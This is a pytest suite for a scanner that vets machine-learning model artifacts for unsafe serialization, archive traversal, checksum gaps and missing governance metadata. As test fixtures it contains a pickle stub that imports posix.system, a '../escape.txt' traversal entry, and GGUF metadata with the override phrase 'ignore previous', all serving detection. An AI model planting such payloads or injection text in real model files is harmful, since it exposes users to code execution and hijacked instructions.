import asyncio
import hashlib
import json
import zipfile
from datetime import datetime, timezone
from pathlib import Path

from scanner.scanner_tools import model_intake
from scanner.scanner_tools.model_intake import (
    _intake_decision,
    normalize_model_artifact_reference,
    parse_huggingface_ref,
    run_model_intake_scan,
)


def _local_options(options=None):
    return {"allow_local_files": True, **(options or {})}


def _safetensors_bytes(metadata=None, tensors=None, payload=b"\0\0\0\0"):
    header = {"__metadata__": metadata or {}, **(tensors or {"weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, len(payload)]}})}
    raw_header = json.dumps(header, separators=(",", ":")).encode("utf-8")
    return len(raw_header).to_bytes(8, "little") + raw_header + payload


def test_model_intake_detects_pickle_and_missing_controls(tmp_path):
    artifact = tmp_path / "unsafe.pkl"
    artifact.write_bytes(b"\x80\x04cposix\nsystem\nq\x00.")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": True,
                "metadata_json": {},
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsafe_serialization" in finding_ids
    assert "model_intake:missing_signature" in finding_ids
    assert "model_intake:missing_checksum" in finding_ids
    assert "model_intake:missing_deployment_approval" in finding_ids
    assert result["model_intake"]["summary"]["format_posture"] == "unsafe_executable_serialization"
    assert result["result"]["grade"] == "F"


def test_model_intake_accepts_signed_safetensors_with_provenance(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.safetensors.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_deployment_approval": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "commit_sha": "abc123",
                    "base_model": "example/base-v1",
                    "tokenizer": "example/tokenizer-v1",
                    "training_data_ref": "dataset:v1",
                    "sigstore_verified": True,
                    "signature_cryptographically_verified": True,
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging", "production"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    assert result["findings"] == []
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"
    assert result["model_intake"]["summary"]["aibom_generated"] is True
    # R1: a metadata-only cryptographic claim is "claimed", never "verified" — real
    # cryptographic verification requires a public key + detached signature.
    assert result["model_intake"]["summary"]["signature_verification_status"] == "claimed_verified"
    assert result["model_intake"]["summary"]["signature_cryptographically_verified"] is False
    assert result["model_intake"]["aibom"]["completeness"]["fields"]["base_model"] is True
    assert any(component["type"] == "tokenizer" for component in result["model_intake"]["aibom"]["components"])
    assert result["result"]["grade"] == "A"
    assert result["result"]["decision"] == "allow"


def test_model_intake_license_policy_requires_permissive_status(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx model bytes")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "vendor-custom-license",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    assert result["model_intake"]["supply_chain"]["license_policy"]["status"] == "review_required"
    assert result["model_intake"]["checks"]["license_policy"] is False


def test_model_intake_does_not_flag_valid_safetensors_metadata_as_pickle(tmp_path):
    header = b'{"__metadata__":{"eval_set":"security-eval","note":"exec text in metadata is not pickle"},"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(len(header).to_bytes(8, "little") + header + b"\0\0\0\0")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.safetensors.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsafe_serialization" not in finding_ids
    assert result["model_intake"]["checks"]["unsafe_serialization"] is True
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"
    assert result["model_intake"]["supply_chain"]["format_inspection"]["safetensors_header"]["valid_json"] is True


def test_model_intake_does_not_compare_full_hash_to_truncated_sample(monkeypatch):
    artifact_bytes = b"a" * 1024
    full_artifact_sha = "06e413d5827a06921fac327ce46db2569a05107ca9723076176809dca1294563"

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        return artifact_bytes, {
            "source": "huggingface",
            "status": 206,
            "bytes_observed": len(artifact_bytes),
            "truncated": True,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    result = asyncio.run(
        run_model_intake_scan(
            "hf://acme/ranker@abc123/model.safetensors",
            {
                "expected_sha256": full_artifact_sha,
                "model_card_url": "https://huggingface.co/acme/ranker",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://huggingface.co/acme/ranker",
                    "license": "apache-2.0",
                    "sha256": full_artifact_sha,
                    "sha256_source": "huggingface_lfs",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            },
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:sha256_mismatch" not in finding_ids
    assert "model_intake:missing_checksum" not in finding_ids
    assert "model_intake:checksum_not_fully_verified" in finding_ids
    assert result["model_intake"]["summary"]["checksum_status"] == "known_unverified_truncated"
    assert result["model_intake"]["summary"]["expected_sha256"] == full_artifact_sha
    assert result["model_intake"]["summary"]["checksum_policy_status"] == "fail_unverified"
    assert result["model_intake"]["checks"]["checksum"] is False
    aibom = result["model_intake"]["aibom"]
    artifact_component = next(item for item in aibom["components"] if item["type"] == "model_artifact")
    assert artifact_component["hashes"] == []
    assert aibom["completeness"]["fields"]["hash"] is False
    assert aibom["declared_artifact_hash"]["content"] == full_artifact_sha
    assert aibom["declared_artifact_hash"]["provenance_class"] == "declared"
    assert aibom["observed_artifact_hash"] is None


def test_model_intake_validates_truncated_safetensors_against_declared_artifact_size(monkeypatch):
    header = b'{"weight":{"dtype":"F32","shape":[25],"data_offsets":[0,100]}}'
    prefix = len(header).to_bytes(8, "little") + header + b"\0\0\0\0"
    full_size = 8 + len(header) + 100

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        return prefix, {
            "source": "huggingface",
            "status": 206,
            "bytes_observed": len(prefix),
            "truncated": True,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    result = asyncio.run(
        run_model_intake_scan(
            "hf://acme/ranker@abc123/model.safetensors",
            {
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": False,
                "metadata_json": {"artifact_size_bytes": full_size},
            },
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    inspection = result["model_intake"]["supply_chain"]["format_inspection"]["safetensors_header"]
    assert "model_intake:safetensors_header_invalid" not in finding_ids
    assert inspection["valid"] is True
    assert inspection["validation_complete"] is True
    assert inspection["payload_size"] == 100
    assert inspection["artifact_size_source"] == "metadata.artifact_size_bytes"
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"


def test_model_intake_treats_truncated_safetensors_without_total_size_as_indeterminate(monkeypatch):
    header = b'{"weight":{"dtype":"F32","shape":[25],"data_offsets":[0,100]}}'
    prefix = len(header).to_bytes(8, "little") + header + b"\0\0\0\0"

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        return prefix, {
            "source": "huggingface",
            "status": 206,
            "bytes_observed": len(prefix),
            "truncated": True,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    result = asyncio.run(
        run_model_intake_scan(
            "hf://acme/ranker@abc123/model.safetensors",
            {
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": False,
            },
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    inspection = result["model_intake"]["supply_chain"]["format_inspection"]["safetensors_header"]
    assert "model_intake:safetensors_header_invalid" not in finding_ids
    assert inspection["valid"] is None
    assert inspection["conclusive_invalid"] is False
    assert inspection["validation_complete"] is False
    assert inspection["payload_bounds_checked"] is False
    assert result["model_intake"]["checks"]["format_specific_inspection"] is None
    assert result["model_intake"]["summary"]["format_posture"] == "unknown_or_unclassified_format"


def test_model_intake_allows_low_and_info_advisories():
    assert _intake_decision([{"severity": "low"}, {"severity": "info"}])["decision"] == "allow"
    assert _intake_decision([{"severity": "medium"}])["decision"] == "review"


def test_download_http_206_without_content_range_is_truncated(monkeypatch):
    # A 206 Partial Content reply to our Range request, returning exactly the cap
    # and no Content-Range total, MUST be flagged truncated — otherwise a capped
    # prefix is hashed and compared against the full-artifact digest, producing a
    # false sha256 mismatch (the nex-agi/Nex-N2-mini case).
    from scanner.scanner_tools import model_intake_acquisition
    from scanner.scanner_tools.model_intake import _download_http

    max_bytes = 1000
    payload = b"x" * max_bytes

    monkeypatch.setattr(model_intake_acquisition, "_resolve_host", lambda host, port: ["93.184.216.34"])
    monkeypatch.setattr(
        model_intake_acquisition,
        "_request_once",
        lambda destination, headers, limit, timeout: (
            payload[:limit],
            {
                "status": 206,
                "reason": "Partial Content",
                "headers": {"Content-Type": "application/octet-stream"},
                "remote_ip": destination["addresses"][0],
            },
        ),
    )
    _data, meta = _download_http("https://cdn.example/model.safetensors", max_bytes, 5)
    assert meta["status"] == 206
    assert meta["truncated"] is True
    assert meta["bytes_observed"] == max_bytes


def test_download_http_200_full_small_file_is_not_truncated(monkeypatch):
    # Control: a 200 with the whole (small) file present is NOT truncated.
    from scanner.scanner_tools import model_intake_acquisition
    from scanner.scanner_tools.model_intake import _download_http

    payload = b"y" * 50

    monkeypatch.setattr(model_intake_acquisition, "_resolve_host", lambda host, port: ["93.184.216.34"])
    monkeypatch.setattr(
        model_intake_acquisition,
        "_request_once",
        lambda destination, headers, limit, timeout: (
            payload[:limit],
            {
                "status": 200,
                "reason": "OK",
                "headers": {"Content-Length": "50"},
                "remote_ip": destination["addresses"][0],
            },
        ),
    )
    _data, meta = _download_http("https://cdn.example/small.bin", 1000, 5)
    assert meta["truncated"] is False


def test_model_intake_runtime_destination_preserves_network_observations():
    destination = model_intake._runtime_destination(
        "artifact",
        "https://models.example.com/start",
        {
            "requested_url": "https://models.example.com/start",
            "final_url": "https://cdn.example.com/model.bin",
            "redirect_chain": ["https://cdn.example.com/model.bin"],
            "remote_ip": "8.8.8.8",
            "source": "http",
        },
    )

    assert destination["redirect_chain"] == ["https://cdn.example.com/model.bin"]
    assert destination["remote_ip"] == "8.8.8.8"
    assert destination["resolved_host"] == "cdn.example.com"


def test_intake_decision_blocks_on_critical_or_high():
    # The single most important decision line: any critical/high finding blocks.
    assert _intake_decision([{"severity": "critical"}])["decision"] == "block"
    assert _intake_decision([{"severity": "high"}])["decision"] == "block"
    # mixed: a high alongside advisories still blocks
    assert _intake_decision([{"severity": "low"}, {"severity": "high"}])["decision"] == "block"
    assert _intake_decision([])["decision"] == "allow"


def test_model_intake_checksum_mismatch_is_critical_and_blocks(tmp_path):
    # A tampered artifact (observed hash != expected) must yield a critical
    # sha256_mismatch finding and a block decision.
    artifact = tmp_path / "model.safetensors"
    data = _safetensors_bytes()
    artifact.write_bytes(data)
    wrong_sha = "0" * 64  # deliberately not the artifact's hash

    result = asyncio.run(run_model_intake_scan(str(artifact), {
        "allow_local_files": True,
        "expected_sha256": wrong_sha,
        "require_signature": False,
        "require_model_governance": False,
    }))
    findings = {f["id"]: f for f in result["findings"]}
    assert "model_intake:sha256_mismatch" in findings
    assert findings["model_intake:sha256_mismatch"]["severity"] == "critical"
    assert result["result"]["decision"] == "block"


def test_model_intake_missing_deployment_approval_is_flagged(tmp_path):
    # With approval required, deployment_approved=False raises the approval finding;
    # the approved twin (only that field changed) does not.
    artifact = tmp_path / "model.safetensors"
    data = _safetensors_bytes()
    artifact.write_bytes(data)
    sha = hashlib.sha256(data).hexdigest()

    def run(approved: bool):
        return asyncio.run(run_model_intake_scan(str(artifact), {
            "allow_local_files": True, "expected_sha256": sha,
            "require_signature": False, "require_model_governance": False,
            "require_deployment_approval": True, "deployment_approved": approved,
        }))

    unapproved_ids = {f["id"] for f in run(False)["findings"]}
    approved_ids = {f["id"] for f in run(True)["findings"]}
    assert "model_intake:missing_deployment_approval" in unapproved_ids
    assert "model_intake:missing_deployment_approval" not in approved_ids


def test_model_intake_uses_artifact_url_extension_when_display_name_has_dots(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "artifact_name": "model-intake.safe.safetensors.v1 local calibration",
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.safetensors.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    assert result["model_intake"]["summary"]["extension"] == ".safetensors"
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"


def test_model_intake_detects_pickle_and_executable_inside_archive(tmp_path):
    artifact = tmp_path / "bundle.zip"
    with zipfile.ZipFile(artifact, "w") as zf:
        zf.writestr("model/data.pkl", b"pickle")
        zf.writestr("scripts/install.sh", b"#!/bin/sh")

    result = asyncio.run(run_model_intake_scan(str(artifact), _local_options({"require_deployment_approval": False})))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsafe_serialization" in finding_ids
    assert "model_intake:embedded_executable" in finding_ids
    archive = result["model_intake"]["artifact"]["archive"]
    assert "model/data.pkl" in archive["pickle_entries"]
    assert "scripts/install.sh" in archive["executable_entries"]


def test_model_intake_flags_archive_traversal_nested_archive_and_risky_config(tmp_path):
    artifact = tmp_path / "bundle.zip"
    nested = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested, "w") as zf:
        zf.writestr("scripts/install.sh", b"#!/bin/sh")
    with zipfile.ZipFile(artifact, "w") as zf:
        zf.writestr("../escape.txt", b"escape")
        zf.write(nested, "nested.zip")
        zf.writestr("config.json", b'{"trust_remote_code": true}')

    result = asyncio.run(run_model_intake_scan(str(artifact), _local_options({"require_deployment_approval": False})))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:archive_path_traversal" in finding_ids
    assert "model_intake:nested_model_archive" in finding_ids
    assert "model_intake:risky_model_config" in finding_ids


def test_model_intake_flags_onnx_external_data_and_custom_operator(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"external_data location customop ai.onnx.contrib")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:onnx_external_data_reference" in finding_ids
    assert "model_intake:onnx_custom_operator" in finding_ids


def test_model_intake_onnx_inspection_does_not_parse_untrusted_protobuf_in_worker():
    inspection = model_intake._inspect_onnx(b"opaque protobuf bytes")

    assert inspection["parsed_with"] == "bounded_string_table"
    assert inspection["parser_status"] == "not_executed_in_worker"
    assert inspection["parser_reason"] == "untrusted_protobuf_requires_generated_scanner_or_sandbox"


def test_scanner_image_installs_onnx_parser_dependency():
    requirements = Path("scanner/requirements.txt").read_text(encoding="utf-8")

    assert "onnx>=" in requirements


def test_model_intake_pickle_detection_does_not_match_ordinary_words():
    assert model_intake._looks_like_pickle(b"retrieval execution evaluation", ".bin") is False


def test_model_intake_pickle_detection_recognizes_protocol_zero():
    assert model_intake._looks_like_pickle(b"(dp0\nVsafe\np1\nVvalue\np2\ns.", ".bin") is True


def test_model_intake_large_observed_safetensors_header_is_validated():
    padding = "x" * 1_100_000
    artifact = _safetensors_bytes(metadata={"description": padding})

    inspection = model_intake._inspect_safetensors(artifact)

    assert inspection["length"] > 1_048_576
    assert inspection["valid"] is True
    assert inspection["validation_complete"] is True


def test_model_intake_worker_clamps_non_api_resource_limits(monkeypatch):
    observed = {}

    async def fake_fetch(ref, max_bytes, timeout_seconds, **kwargs):
        observed.update({"max_bytes": max_bytes, "timeout_seconds": timeout_seconds})
        return b"model", {"source": "http", "status": 200, "bytes_observed": 5, "truncated": False}

    monkeypatch.setattr(model_intake, "_fetch_artifact", fake_fetch)

    asyncio.run(run_model_intake_scan(
        "https://models.example/model.bin",
        {
            "max_download_bytes": 10**30,
            "timeout_seconds": 10**30,
            "max_artifact_bytes": 10**30,
            "max_repository_bytes": 10**30,
            "max_repository_files": 10**30,
            "require_hash": False,
            "require_signature": False,
            "require_model_governance": False,
            "require_deployment_approval": False,
        },
    ))

    assert observed == {
        "max_bytes": model_intake.MAX_INSPECTION_BYTES,
        "timeout_seconds": model_intake.MAX_TIMEOUT_SECONDS,
    }


def test_model_intake_flags_malformed_safetensors_header(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes((1024).to_bytes(8, "little") + b"{")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": False,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:safetensors_header_invalid" in finding_ids
    assert result["model_intake"]["checks"]["format_specific_inspection"] is False
    assert result["model_intake"]["summary"]["format_posture"] != "safer_static_format"


def test_model_intake_flags_suspicious_gguf_metadata(tmp_path):
    artifact = tmp_path / "model.gguf"
    artifact.write_bytes(b"GGUF" + (3).to_bytes(4, "little") + (1).to_bytes(8, "little") + (1).to_bytes(8, "little") + b" chat_template tool_call ignore previous")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": False,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:gguf_suspicious_metadata" in finding_ids
    assert result["model_intake"]["supply_chain"]["format_inspection"]["gguf"]["valid_header"] is True


def test_model_intake_strict_governance_requires_poisoning_lineage(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": True,
                "strict_governance": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": [{"name": "transformers"}]},
                    "malware_scan_result": {
                        "status": "clean",
                        "scanner": "yara",
                        "engine_version": "1",
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "artifact_digest": hashlib.sha256(artifact.read_bytes()).hexdigest(),
                    },
                    "security_evals": {
                        "status": "passed",
                        "suite_id": "security-v1",
                        "date": datetime.now(timezone.utc).isoformat(),
                        "target_sha256": hashlib.sha256(artifact.read_bytes()).hexdigest(),
                        "thresholds": {"leak_rate": 0},
                    },
                    "deployment_restrictions": ["production"],
                    "monitoring_plan": "monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:missing_dataset_lineage" in finding_ids
    assert "model_intake:missing_base_model_lineage" in finding_ids
    assert "model_intake:missing_poisoning_eval_evidence" in finding_ids
    assert result["model_intake"]["checks"]["dataset_lineage"] is False
    assert result["model_intake"]["checks"]["poisoning_evals"] is False


def test_model_intake_records_fetch_failures_as_findings(tmp_path):
    missing = tmp_path / "missing.safetensors"

    result = asyncio.run(run_model_intake_scan(str(missing), _local_options({"require_deployment_approval": False})))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:artifact_fetch_failed" in finding_ids
    assert result["model_intake"]["artifact"]["fetch"]["error"].startswith("FileNotFoundError")


def test_model_intake_blocks_local_file_reads_by_default(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(b"safe tensor bytes")

    result = asyncio.run(run_model_intake_scan(str(artifact), {"require_deployment_approval": False}))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:artifact_fetch_failed" in finding_ids
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "local_file"
    assert "Local artifact reads are disabled" in result["model_intake"]["artifact"]["fetch"]["error"]


def test_model_intake_complete_acquisition_verifies_full_hash_and_full_zip(tmp_path):
    artifact = tmp_path / "pytorch_model.bin"
    quarantine = tmp_path / "quarantine"
    with zipfile.ZipFile(artifact, "w") as zf:
        zf.writestr("padding.bin", b"x" * 4096)
        zf.writestr("archive/data.pkl", b"\x80\x04cposix\nsystem\nq\x00.")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options(
                {
                    "complete_artifact_download": True,
                    "max_download_bytes": 64,
                    "max_artifact_bytes": 100_000,
                    "quarantine_dir": str(quarantine),
                    "expected_sha256": expected_sha,
                    "require_signature": False,
                    "require_model_governance": False,
                    "require_deployment_approval": False,
                }
            ),
        )
    )

    summary = result["model_intake"]["summary"]
    fetch = result["model_intake"]["artifact"]["fetch"]
    assert summary["sha256"] == expected_sha
    assert summary["sha256_scope"] == "full_artifact"
    assert summary["checksum_status"] == "verified"
    assert summary["acquisition_complete"] is True
    assert summary["inspection_complete"] is False
    assert fetch["complete"] is True
    assert fetch["inspection_truncated"] is True
    assert "_quarantine_path" not in fetch
    assert result["model_intake"]["artifact"]["archive"]["pickle_entries"] == ["archive/data.pkl"]
    assert "model_intake:unsafe_serialization" in {finding["id"] for finding in result["findings"]}


def test_model_intake_blocks_incomplete_manifest_and_unreviewed_custom_code(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options(
                {
                    "expected_sha256": expected_sha,
                    "require_signature": False,
                    "require_model_governance": False,
                    "require_deployment_approval": False,
                    "metadata_json": {
                        "repository_manifest": {
                            "manifest_sha256": "a" * 64,
                            "complete": False,
                            "files_discovered": 3,
                            "files_recorded": 2,
                            "invalid_paths": [{"path": "../escape.py", "reason": "non_normalized_path"}],
                            "custom_code_required": True,
                            "python_files": ["modeling.py"],
                            "executable_files": ["modeling.py"],
                        }
                    },
                }
            ),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:repository_manifest_incomplete" in finding_ids
    assert "model_intake:custom_model_code_requires_review" in finding_ids
    assert result["model_intake"]["checks"]["repository_manifest"] is False
    assert result["model_intake"]["checks"]["custom_code_review"] is False
    assert result["result"]["decision"] == "block"


def test_huggingface_repository_snapshot_acquires_every_manifest_file(monkeypatch, tmp_path):
    revision = "a" * 40
    selected_bytes = b"weights"
    code_bytes = b"class Model: pass\n"
    selected_sha = hashlib.sha256(selected_bytes).hexdigest()
    code_sha = hashlib.sha256(code_bytes).hexdigest()
    observed_urls = []

    def fake_complete_download(url, inspection_bytes, max_bytes, timeout, quarantine_dir, headers=None, policy=None):
        observed_urls.append(url)
        assert url.endswith(f"/{revision}/modeling.py")
        return code_bytes, {
            "complete": True,
            "sha256": code_sha,
            "bytes_total": len(code_bytes),
            "quarantine_object": f"sha256:{code_sha}",
        }

    monkeypatch.setattr(model_intake, "_safe_download_http_to_quarantine", fake_complete_download)
    metadata = {
        "huggingface_repo": "acme/ranker",
        "huggingface_file": "model.safetensors",
        "revision": revision,
        "repository_manifest": {
            "complete": True,
            "repository": "acme/ranker",
            "revision": revision,
            "manifest_sha256": "f" * 64,
            "files": [
                {"path": "model.safetensors", "size_bytes": len(selected_bytes), "sha256": selected_sha},
                {"path": "modeling.py", "size_bytes": len(code_bytes), "blob_id": "git-blob"},
            ],
        },
    }

    snapshot = asyncio.run(
        model_intake._acquire_huggingface_repository_snapshot(
            metadata,
            timeout_seconds=5,
            quarantine_dir=tmp_path,
            fetch_policy=None,
            max_repository_bytes=10_000,
            max_repository_files=10,
            selected_artifact_meta={
                "complete": True,
                "sha256": selected_sha,
                "bytes_total": len(selected_bytes),
                "quarantine_object": f"sha256:{selected_sha}",
            },
        )
    )

    assert snapshot["status"] == "PASS"
    assert snapshot["complete"] is True
    assert snapshot["files_expected"] == snapshot["files_acquired"] == 2
    assert snapshot["bytes_acquired"] == len(selected_bytes) + len(code_bytes)
    assert len(snapshot["snapshot_sha256"]) == 64
    assert observed_urls == [f"https://huggingface.co/acme/ranker/resolve/{revision}/modeling.py"]


def test_huggingface_repository_snapshot_rejects_mutable_revision(tmp_path):
    snapshot = asyncio.run(
        model_intake._acquire_huggingface_repository_snapshot(
            {
                "huggingface_repo": "acme/ranker",
                "revision": "main",
                "repository_manifest": {
                    "complete": True,
                    "repository": "acme/ranker",
                    "revision": "main",
                    "files": [{"path": "model.safetensors"}],
                },
            },
            timeout_seconds=5,
            quarantine_dir=tmp_path,
            fetch_policy=None,
            max_repository_bytes=10_000,
            max_repository_files=10,
        )
    )

    assert snapshot["status"] == "INCOMPLETE"
    assert snapshot["error"] == "repository_revision_not_immutable"


def test_generated_scanners_require_complete_quarantined_subject(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options(
                {
                    "run_generated_scanners": True,
                    "generated_scanner_names": [],
                    "require_hash": False,
                    "require_signature": False,
                    "require_model_governance": False,
                    "require_deployment_approval": False,
                }
            ),
        )
    )

    evidence = result["model_intake"]["generated_evidence"]
    assert evidence["status"] == "FAIL"
    assert evidence["statuses"] == {"subject-materialization": "INCOMPLETE"}
    assert "model_intake:generated_scanner_subject_materialization_non_pass" in {
        finding["id"] for finding in result["findings"]
    }


def test_model_intake_reports_unsupported_artifact_scheme():
    result = asyncio.run(
        run_model_intake_scan(
            "oci://honey/unsafe-pickle",
            {"timeout_seconds": 5},
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsupported_artifact_scheme" in finding_ids
    assert "model_intake:missing_license_review" in finding_ids
    assert "model_intake:missing_sbom_or_dependencies" in finding_ids
    assert any(finding["severity"] == "high" for finding in result["findings"])
    assert result["result"]["decision"] == "block"
    assert result["model_intake"]["summary"]["format_posture"] == "unknown_or_unclassified_format"


def test_model_intake_runs_metadata_governance_for_unsupported_registry_refs():
    result = asyncio.run(
        run_model_intake_scan(
            "oci://honey.local/models/safe:latest",
            {
                "expected_sha256": "abc",
                "signature_url": "https://example.test/model.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_deployment_approval": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            },
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    # Containment, not exact-set equality: a new advisory check firing on this input
    # should not false-fail the assertion that the unsupported scheme is rejected.
    assert "model_intake:unsupported_artifact_scheme" in finding_ids
    assert result["model_intake"]["checks"]["license_review"] is True
    assert result["model_intake"]["checks"]["sbom_dependencies"] is True


def test_model_intake_reports_metadata_fetch_failure_without_fake_missing_governance(tmp_path):
    artifact = tmp_path / "model.onnx"
    metadata = tmp_path / "metadata.json"
    artifact.write_bytes(b"onnx bytes")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "metadata_url": str(metadata),
                "require_deployment_approval": True,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:metadata_fetch_failed" in finding_ids
    assert "model_intake:missing_license_review" not in finding_ids
    assert "model_intake:missing_sbom_or_dependencies" not in finding_ids
    assert result["model_intake"]["checks"]["license_review"] is None
    assert result["model_intake"]["summary"]["metadata_fetch_failed"] is True


def test_model_intake_flags_missing_governance_metadata(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.onnx.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "commit_sha": "abc123",
                    "training_data_ref": "dataset:v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:missing_license_review" in finding_ids
    assert "model_intake:missing_sbom_or_dependencies" in finding_ids
    assert "model_intake:missing_eval_evidence" in finding_ids
